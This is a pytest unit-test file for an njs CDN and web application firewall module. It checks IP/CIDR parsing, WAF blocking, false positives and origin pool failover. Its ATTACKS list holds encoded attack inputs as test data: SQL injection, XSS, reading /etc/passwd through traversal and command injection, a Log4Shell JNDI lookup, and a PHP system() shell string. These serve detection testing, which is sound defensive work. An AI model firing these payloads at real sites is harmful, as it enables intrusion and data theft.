"""Unit tests for njs/pcdn.js logic, executed with node (same ECMAScript subset) and mocked r / ngx.

The real njs runtime is covered by test_nginx_e2e.py; this file checks the pure logic
(CIDR/IPv6 parsing, WAF false positives, pool selection) quickly and exhaustively.
"""

import json
import pathlib
import shutil
import subprocess

import pytest

HERE = pathlib.Path(__file__).resolve().parent
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")

ALL_GROUPS = ["sqli", "xss", "lfi", "rce", "php", "scanner", "protocol"]

HARNESS = r"""
import m from './pcdn.mjs';
import { T } from './pcdn.mjs';
const store = {};
const dict = { get: k => store[k], set: (k, v) => { store[k] = v; }, incr: (k, d, i) => (store[k] = (store[k] === undefined ? i : store[k]) + d) };
globalThis.ngx = { shared: { pcdn_cnt: dict, pcdn_blk: dict, pcdn_hc: dict } };
function req(site, uri, args, extra) {
  extra = extra || {};
  const vars = Object.assign({ pcdn_site: site, remote_addr: '127.0.0.1', request_uri: uri + (args ? '?' + args : ''),
    args: args, host: 'x.test', pcdn_country: 'IR', ssl_protocol: '' }, extra.vars || {});
  return { uri: uri, method: extra.method || 'GET', variables: vars, headersIn: Object.assign({ 'User-Agent': 'Mozilla/5.0' }, extra.headers || {}),
    args: {}, error: () => {} };
}
const cases = JSON.parse(process.argv[2]);
const out = cases.map(c => {
  if (c.kind === 'cidr') return T.inCidr(T.parseIP(c.ip), T.cidr(c.net));
  if (c.kind === 'ip') return T.parseIP(c.ip);
  if (c.kind === 'verdict') return m.verdict(req(c.site, c.uri, c.args || '', c.extra));
  if (c.kind === 'upstream') {
    const seen = {};
    for (let i = 0; i < c.n; i++) { const h = m.upstream(req(c.site, '/', '', { vars: { pcdn_pool: c.pool, remote_addr: c.ip || ('10.0.0.' + (i % 250)) } })); seen[h] = (seen[h] || 0) + 1; }
    return seen;
  }
  if (c.kind === 'hc') { store[c.key] = c.value; return null; }
});
console.log(JSON.stringify(out));
"""


def build(tmp_path, sites):
    src = (HERE.parent / "njs/pcdn.js").read_text()
    src = src.replace("from 'sites.js'", "from './sites.mjs'")
    src += "\nexport const T = { parseIP, cidr, inCidr, fnv };\n"
    (tmp_path / "pcdn.mjs").write_text(src)
    (tmp_path / "sites.mjs").write_text("export default " + json.dumps(sites) + ";\n")
    (tmp_path / "h.mjs").write_text(HARNESS)


def run(tmp_path, cases):
    p = subprocess.run(["node", str(tmp_path / "h.mjs"), json.dumps(cases)], capture_output=True, text=True, cwd=tmp_path)
    assert p.returncode == 0, p.stderr
    return json.loads(p.stdout)


def site(**kw):
    s = {"domain": "x.test", "secret": "k", "hosts": ["x.test"], "blocked_ips": [], "min_tls": "1.2",
         "firewall": {"default_action": "allow", "rules": []}, "hotlink": {"enabled": False}, "ratelimit": [],
         "ddos": {"mode": "off"}, "waf": {"mode": "off", "groups": [], "exclusions": [], "off_paths": []},
         "pools": {}, "image": {"enabled": False}}
    s.update(kw)
    return s


def test_cidr_and_ipv6(tmp_path):
    build(tmp_path, {})
    cases = [("10.1.2.3", "10.0.0.0/8", True), ("11.1.2.3", "10.0.0.0/8", False), ("1.2.3.4", "0.0.0.0/0", True),
             ("1.2.3.4", "1.2.3.4", True), ("1.2.3.5", "1.2.3.4/32", False), ("192.168.1.255", "192.168.1.0/24", True),
             ("2001:db8::1", "2001:db8::/32", True), ("2001:db9::1", "2001:db8::/32", False),
             ("::1", "::1/128", True), ("2001:db8:0:0:1::", "2001:db8::/64", True),
             ("2001:db8:0:1::", "2001:db8::/64", False), ("2001:db8::1", "10.0.0.0/8", False),
             ("::ffff:10.0.0.1", "::ffff:10.0.0.0/104", True), ("fe80::1", "fe80::/10", True), ("fec0::1", "fe80::/10", False)]
    res = run(tmp_path, [{"kind": "cidr", "ip": ip, "net": net} for ip, net, _ in cases])
    assert res == [want for *_, want in cases]
    ips = run(tmp_path, [{"kind": "ip", "ip": x} for x in ("::ffff:10.0.0.1", "1:2:3:4:5:6:7:8", "1::2::3", "1.2.3.256", "abc")])
    assert ips[0] == {"v": 6, "a": [0, 0, 0, 0, 0, 0xffff, 0x0a00, 1]}
    assert ips[1]["a"] == [1, 2, 3, 4, 5, 6, 7, 8]
    assert ips[2:] == [None, None, None]


BENIGN = [
    ("/", ""), ("/blog/2024/01/hello-world", "utm_source=news&utm_medium=email"),
    ("/search", "q=O%27Reilly+and+sons"), ("/search", "q=rock+%27n%27+roll"), ("/search", "q=it%27s+fine+or+not"),
    ("/", "email=a%40b.com&redirect=https%3A%2F%2Fexample.com%2Fa%3Fb%3Dc"), ("/p", "q=1%2B1%3D2"),
    ("/products", "sort=price&order=desc&page=2"), ("/wp-content/uploads/2024/05/photo.jpg", ""),
    ("/search", "q=select+a+plan"), ("/cart", "coupon=SAVE-20%25"), ("/api/v1/items", "ids=1,2,3&fields=name,price"),
    ("/search", "q=%D8%B3%D9%84%D8%A7%D9%85+%D8%AF%D9%86%DB%8C%D8%A7"), ("/docs/a.b.c/index.html", ""),
    ("/", "text=Tom%27s+and+Jerry%27s+best+episodes"), ("/", "q=php+tutorial"), ("/", "q=cat+food"),
]
ATTACKS = [
    ("/", "id=1%27+or+%271%27%3D%271", 942100), ("/", "id=1+or+1%3D1", 942110), ("/", "q=1+union+select+user,pass+from+users", 942190),
    ("/", "id=1+and+sleep(5)", 942160), ("/", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", 941100),
    ("/", "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", 941110), ("/", "u=javascript%3Aalert(1)", 941120),
    ("/", "f=..%2F..%2Fetc%2Fpasswd", 930100), ("/", "cmd=%3Bcat+%2Fetc%2Fpasswd", 930110),
    ("/", "x=%24%7Bjndi%3Aldap%3A%2F%2Fe.com%2Fa%7D", 932110), ("/", "c=%3C%3Fphp+system(%24_GET%5Bx%5D)", 933100),
    ("/", "f=php%3A%2F%2Ffilter%2Fresource%3Dindex", 933110), ("/.env", "", 913120),
    ("/", "id=1%2527%2520or%2520%25271%2527%253D%25271", 942100),  # double-encoded payloads are decoded again
]


def test_waf_signatures_and_false_positives(tmp_path):
    waf = {"mode": "block", "paranoia": 1, "groups": ALL_GROUPS, "exclusions": [], "off_paths": []}
    build(tmp_path, {"1": site(waf=waf)})
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a in BENIGN])
    assert res == ["ok"] * len(BENIGN), list(zip(BENIGN, res))
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a, _ in ATTACKS])
    assert res == [f"block:waf:{rid}" for *_, rid in ATTACKS]
    # scanner UA, unknown method, null byte
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "Nikto/2.5"}}},
                         {"kind": "verdict", "site": "1", "uri": "/", "extra": {"method": "TRACK"}},
                         {"kind": "verdict", "site": "1", "uri": "/a", "args": "x=%00"}])
    assert res == ["block:waf:913100", "block:waf:920100", "block:waf:920270"]


def test_waf_paranoia_and_groups(tmp_path):
    base = {"mode": "detect", "exclusions": [], "off_paths": []}
    build(tmp_path, {"1": site(waf=dict(base, paranoia=1, groups=["xss"])),
                     "2": site(waf=dict(base, paranoia=2, groups=["sqli"])),
                     "3": site(waf=dict(base, paranoia=1, groups=["sqli"]))})
    q = "q=select+name+from+users"
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "args": "id=1+or+1%3D1"},
                         {"kind": "verdict", "site": "2", "uri": "/", "args": q},
                         {"kind": "verdict", "site": "3", "uri": "/", "args": q}])
    assert res == ["ok", "log:waf:942400", "ok"]


def test_firewall_country_unknown_matches_nothing(tmp_path):
    rules = [{"id": "notir", "action": "block", "conditions": [{"field": "country", "op": "not_in", "value": ["IR"]}]}]
    build(tmp_path, {"1": site(firewall={"default_action": "allow", "rules": rules})})
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "extra": {"vars": {"pcdn_country": cc}}}
                         for cc in ("IR", "DE", "")])
    assert res == ["ok", "block:firewall:notir", "ok"]


def test_pool_selection(tmp_path):
    pool = {"method": "weighted", "protocol": "http", "health": {"enabled": True, "path": "/", "interval": 5, "timeout": 2, "expect": "2xx"},
            "origins": [{"hp": "10.0.0.1:80", "weight": 3, "backup": False}, {"hp": "10.0.0.2:80", "weight": 1, "backup": False},
                        {"hp": "10.0.0.9:80", "weight": 1, "backup": True}]}
    sticky = dict(pool, method="ip_hash")
    build(tmp_path, {"1": site(pools={"main": pool, "sticky": sticky})})
    res = run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "main", "n": 4000}])[0]
    assert set(res) == {"10.0.0.1:80", "10.0.0.2:80"} and 2.4 < res["10.0.0.1:80"] / res["10.0.0.2:80"] < 3.8
    res = run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "sticky", "n": 50, "ip": "203.0.113.7"}])[0]
    assert len(res) == 1  # same client, same origin
    down = [{"kind": "hc", "key": "1|main|10.0.0.1:80", "value": 2}, {"kind": "hc", "key": "1|main|10.0.0.2:80", "value": 5}]
    res = run(tmp_path, down + [{"kind": "upstream", "site": "1", "pool": "main", "n": 50}])[-1]
    assert res == {"10.0.0.9:80": 50}  # backup only when every primary is down
    res = run(tmp_path, down + [{"kind": "hc", "key": "1|main|10.0.0.9:80", "value": 3},
                                {"kind": "upstream", "site": "1", "pool": "main", "n": 400}])[-1]
    assert set(res) == {"10.0.0.1:80", "10.0.0.2:80"}  # everything down: fail open to the primaries
    assert run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "nope", "n": 1}])[0] == {"127.0.0.1:9": 1}
